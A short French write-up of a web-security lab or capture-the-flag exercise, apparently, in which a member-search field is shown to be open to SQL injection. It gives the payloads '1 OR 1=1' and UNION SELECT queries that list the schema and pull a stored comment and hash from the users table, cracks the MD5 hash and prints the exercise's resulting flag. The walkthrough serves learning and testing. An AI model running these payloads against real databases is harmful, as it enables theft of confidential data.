En faisaint une recher de membre on peut s'apercevoir que celle ci est vulnérable à une injection SQL,
en tapant 1 OR 1=1 on peut voir que la requête retourne tous les membres de la base de données.

1 OR 1 = 1 est une expression booléenne qui est toujours vraie, donc a partir d'une requetes que l'on peut imaginer comme celle ci:

SELECT id, firstname, surname FROM users WHERE id = $_GET['id'];

qui va donc donner : 

SELECT id, firstname, surname FROM users WHERE id = 1 OR 1 = 1;

qui va donc retourner tous les membres de la base de données.

L'opérateur UNION permet de combiner les résultats de plusieurs requêtes SQL en une seule.
On peut faire une requête de ce type pour récupérer le nom de la table et des colonnes de la base de données:
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns;

apres exploration de la db on peut trouver dans la table users et dans le champs commentaire :
1 OR 1=1 UNION SELECT Commentaire, countersign from users 

ID: 1 OR 1=1 UNION SELECT Commentaire, countersign from users  
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

On peut donc en déduire que le mot de passe est chiffré en md5 (hexadecimal et 32 caractere)

md5 -> FortyTwo
fortytwo en Sh256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Risque :
- Un attaquant peut recuperer des informations confidentielles dans la base de données